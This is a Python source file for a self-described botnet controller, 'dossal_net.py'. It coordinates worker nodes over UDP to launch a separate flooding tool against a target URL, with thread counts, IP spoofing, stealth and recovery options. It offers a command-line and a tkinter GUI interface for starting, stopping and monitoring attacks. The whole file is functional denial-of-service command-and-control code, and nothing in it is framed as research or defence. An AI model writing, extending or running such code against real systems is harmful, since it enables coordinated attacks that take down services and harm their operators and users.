#!/usr/bin/env python3
"""
dossal_net.py — Multi-node botnet controller
Control multiple dossal instances over UDP.

Usage:
  Controller: python dossal_net.py --controller --port 9999
  Worker:     python dossal_net.py --worker --controller 1.2.3.4:9999 --id node1

Commands (controller sends JSON to workers):
  {"cmd": "start", "url": "http://target:80", "mode": "auto", "duration": 30, "threads": 16, "spoof": 100, "stealth": true, "recovery": true}
  {"cmd": "stop"}
  {"cmd": "status"}
  {"cmd": "shutdown"}

Workers respond:
  {"node": "node1", "status": "running", "rps": 12345, "packets": 67890}
"""
import socket, json, threading, subprocess, sys, os, time, argparse

def run_worker(controller_addr, node_id, listen_port=9998):
    """워커: 명령 수신 + dossal 실행 (UDP)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', listen_port))
    print(f"[{node_id}] Worker listening on :{listen_port}")
    print(f"[{node_id}] Controller: {controller_addr}")
    
    proc = None
    stats = {'status': 'idle', 'rps': 0, 'packets': 0}
    
    # Register with controller on startup
    try:
        hello = json.dumps({'node': node_id, 'cmd': 'hello', 'status': 'idle'}).encode()
        sock.sendto(hello, controller_addr)
        print(f"[{node_id}] Registered with controller")
    except Exception as e:
        print(f"[{node_id}] Registration failed: {e}")
    
    # Auto-report status every 2 seconds
    def reporter():
        """워커 상태 2초 간격 출력."""
        while True:
            time.sleep(2)
            try:
                msg = json.dumps({'node': node_id, **stats}).encode()
                sock.sendto(msg, controller_addr)
            except: pass
    threading.Thread(target=reporter, daemon=True).start()
    
    while True:
        try:
            data, addr = sock.recvfrom(65535)
            cmd = json.loads(data.decode())
            
            if cmd['cmd'] == 'start':
                if proc:
                    proc.terminate()
                url = cmd.get('url', 'http://target:80')
                mode = cmd.get('mode', 'auto')
                duration = cmd.get('duration', 30)
                threads = cmd.get('threads', 16)
                args = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dossal.py')]
                args.extend(['--url', url, '--duration', str(duration), '--threads', str(threads), '--live'])
                if mode != 'auto':
                    args.extend(['--mode', mode])
                else:
                    args.append('--auto')
                if cmd.get('spoof', 0) > 0:
                    args.extend(['--spoof', str(cmd['spoof'])])
                if cmd.get('stealth'):
                    args.append('--stealth')
                if cmd.get('recovery'):
                    args.append('--recovery')
                if cmd.get('proxy'):
                    args.extend(['--proxy', cmd['proxy']])
                
                print(f"[{node_id}] START: {url} mode={mode} threads={threads} spoof={cmd.get('spoof',0)}")
                proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stats['status'] = 'running'
                stats['rps'] = 0
                stats['packets'] = 0
                
                # Read live stats from proc
                def reader():
                    """워커 출력 스레드 (dossal stdout 읽기)."""
                    if proc and proc.stdout:
                        for line in proc.stdout:
                            line = line.strip()
                        if 'RPS=' in line:
                            import re
                            m = re.search(r'RPS=([\d,]+)', line)
                            if m:
                                stats['rps'] = int(m.group(1).replace(',', ''))
                            m = re.search(r'PPS=([\d,]+)', line)
                            if m:
                                stats['packets'] = int(m.group(1).replace(',', ''))
                    # Process ended
                    stats['status'] = 'done'
                threading.Thread(target=reader, daemon=True).start()
                
            elif cmd['cmd'] == 'stop':
                if proc:
                    proc.terminate()
                    proc = None
                stats['status'] = 'stopped'
                print(f"[{node_id}] STOP")
                
            elif cmd['cmd'] == 'status':
                msg = json.dumps({'node': node_id, **stats}).encode()
                sock.sendto(msg, addr)
                
            elif cmd['cmd'] == 'shutdown':
                if proc:
                    proc.terminate()
                stats['status'] = 'shutting_down'
                print(f"[{node_id}] SHUTDOWN")
                sock.close()
                break
                
        except Exception as e:
            print(f"[{node_id}] Error: {e}")
            time.sleep(1)

def run_controller_gui(port=9999):
    """GUI 컨트롤러: tkinter 기반 봇넷 컨트롤 (START/STOP/SHUTDOWN)."""
    import tkinter as tk
    from tkinter import ttk, scrolledtext
    
    root = tk.Tk()
    root.title("dossal Botnet Controller")
    root.geometry("600x400")
    root.configure(bg='#1a1a2e')
    
    # State
    workers = {}  # node_id -> (addr, stats, last_seen)
    
    # UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    sock.settimeout(0.5)
    
    # UI
    top = ttk.Frame(root, padding=5)
    top.pack(fill=tk.X)
    
    ttk.Label(top, text="URL:").pack(side=tk.LEFT)
    url_var = tk.StringVar(value="http://target:80")
    ttk.Entry(top, textvariable=url_var, width=30).pack(side=tk.LEFT, padx=5)
    
    threads_var = tk.StringVar(value="8")
    ttk.Label(top, text="Threads:").pack(side=tk.LEFT)
    ttk.Entry(top, textvariable=threads_var, width=5).pack(side=tk.LEFT, padx=5)
    
    duration_var = tk.StringVar(value="30")
    ttk.Label(top, text="Duration:").pack(side=tk.LEFT)
    ttk.Entry(top, textvariable=duration_var, width=5).pack(side=tk.LEFT, padx=5)
    
    def do_start():
        """GUI START 버튼: 모든 워커에 start 명령 전송."""
        url = url_var.get().strip()
        if not url:
            return
        cmd = {'cmd': 'start', 'url': url, 'mode': 'auto',
               'duration': int(duration_var.get()), 'threads': int(threads_var.get()),
               'spoof': 100, 'stealth': True, 'recovery': True}
        for node, (addr, _, _) in workers.items():
            sock.sendto(json.dumps(cmd).encode(), addr)
        log.insert(tk.END, f"→ START {url} to {len(workers)} workers\n")
        log.see(tk.END)
    
    def do_stop():
        """GUI STOP 버튼: 모든 워커에 stop 명령 전송."""
        for node, (addr, _, _) in workers.items():
            sock.sendto(json.dumps({'cmd': 'stop'}).encode(), addr)
        log.insert(tk.END, f"→ STOP to {len(workers)} workers\n")
        log.see(tk.END)
    
    def do_shutdown():
        """GUI SHUTDOWN 버튼: 모든 워커 종료."""
        for node, (addr, _, _) in workers.items():
            sock.sendto(json.dumps({'cmd': 'shutdown'}).encode(), addr)
        log.insert(tk.END, f"→ SHUTDOWN to {len(workers)} workers\n")
        log.see(tk.END)
    
    ttk.Button(top, text="START", command=do_start, style='Start.TButton').pack(side=tk.LEFT, padx=5)
    ttk.Button(top, text="STOP", command=do_stop).pack(side=tk.LEFT, padx=5)
    ttk.Button(top, text="SHUTDOWN", command=do_shutdown).pack(side=tk.LEFT, padx=5)
    
    # Workers table
    mid = ttk.Frame(root, padding=5)
    mid.pack(fill=tk.X)
    ttk.Label(mid, text=f"Workers (port {port}):", foreground='white', background='#1a1a2e').pack(anchor=tk.W)
    
    workers_text = tk.Text(mid, height=6, bg='#0f0f23', fg='#00ff88', font=('Consolas', 10), state=tk.DISABLED)
    workers_text.pack(fill=tk.X)
    
    # Log
    bottom = ttk.Frame(root, padding=5)
    bottom.pack(fill=tk.BOTH, expand=True)
    log = scrolledtext.ScrolledText(bottom, height=10, bg='#0f0f23', fg='#ccc', font=('Consolas', 10))
    log.pack(fill=tk.BOTH, expand=True)
    log.insert(tk.END, f"[controller] GUI listening on :{port}\n")
    
    # Receive loop
    def receive():
        """워커 상태/결과 수신 (UDP recvfrom)."""
        try:
            data, addr = sock.recvfrom(65535)
            msg = json.loads(data.decode())
            node = msg.get('node', 'unknown')
            workers[node] = (addr, msg, time.time())
            # Update workers display
            workers_text.config(state=tk.NORMAL)
            workers_text.delete(1.0, tk.END)
            for n, (a, m, s) in sorted(workers.items()):
                age = time.time() - s
                workers_text.insert(tk.END, f"  {n}: {m.get('status','?'):10s} RPS={m.get('rps',0):>10,} @ {a[0]}:{a[1]} ({age:.0f}s)\n")
            workers_text.config(state=tk.DISABLED)
        except socket.timeout:
            pass
        except Exception as e:
            pass
        root.after(500, receive)
    
    root.after(500, receive)
    root.mainloop()

def run_controller(port=9999):
    """CLI 컨트롤러: 워커에 명령 전송 + 상태 수신 (stdin 기반)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    sock.settimeout(1.0)
    print(f"[controller] Listening on :{port}")
    print(f"[controller] Type 'workers' to list, 'start <url>' to attack, 'stop' to stop")
    
    workers = {}  # node_id -> (addr, last_stats, last_seen)
    
    while True:
        # Check for worker status updates
        try:
            data, addr = sock.recvfrom(65535)
            msg = json.loads(data.decode())
            node = msg.get('node', 'unknown')
            workers[node] = (addr, msg, time.time())
            # Display status
            rps = msg.get('rps', 0)
            pkts = msg.get('packets', 0)
            status = msg.get('status', '?')
            print(f"  [{node}] {status} RPS={rps:,} PKTS={pkts:,}")
        except socket.timeout:
            pass
        
        # Handle user input
        import select
        r, _, _ = select.select([sys.stdin], [], [], 0.1)
        if r:
            line = sys.stdin.readline().strip()
            if not line:
                continue
            
            if line == 'workers':
                for node, (addr, msg, seen) in workers.items():
                    age = time.time() - seen
                    print(f"  {node}: {msg.get('status','?')} RPS={msg.get('rps',0):,} @ {addr[0]}:{addr[1]} ({age:.0f}s ago)")
            
            elif line.startswith('start '):
                url = line[6:].strip()
                cmd = {'cmd': 'start', 'url': url, 'mode': 'auto', 'duration': 30, 'threads': 16, 'spoof': 100, 'stealth': True, 'recovery': True}
                for node, (addr, _, _) in workers.items():
                    sock.sendto(json.dumps(cmd).encode(), addr)
                print(f"  → START {url} to {len(workers)} workers")
            
            elif line == 'stop':
                for node, (addr, _, _) in workers.items():
                    sock.sendto(json.dumps({'cmd': 'stop'}).encode(), addr)
                print(f"  → STOP to {len(workers)} workers")
            
            elif line == 'shutdown':
                for node, (addr, _, _) in workers.items():
                    sock.sendto(json.dumps({'cmd': 'shutdown'}).encode(), addr)
                print(f"  → SHUTDOWN to {len(workers)} workers")
                break
            
            elif line == 'quit':
                break

def main():
    """dossal_net 메인 진입점 (컨트롤러/워커/GUI 선택)."""
    ap = argparse.ArgumentParser(description='dossal multi-node botnet')
    ap.add_argument('--controller', action='store_true', help='Run as controller')
    ap.add_argument('--worker', action='store_true', help='Run as worker')
    ap.add_argument('--port', type=int, default=9999, help='Controller port')
    ap.add_argument('--listen-port', type=int, default=9998, help='Worker listen port')
    ap.add_argument('--controller-addr', default=None, help='Controller address (for worker)')
    ap.add_argument('--id', default='node1', help='Node ID (for worker)')
    ap.add_argument('--gui', action='store_true', help='Run controller with GUI')
    args = ap.parse_args()
    
    if args.worker:
        if not args.controller_addr:
            print("Worker needs --controller-addr HOST:PORT")
            return
        host, port = args.controller_addr.rsplit(':', 1)
        run_worker((host, int(port)), args.id, args.listen_port)
    elif args.gui:
        run_controller_gui(args.port)
    else:
        run_controller(args.port)

if __name__ == '__main__':
    main()
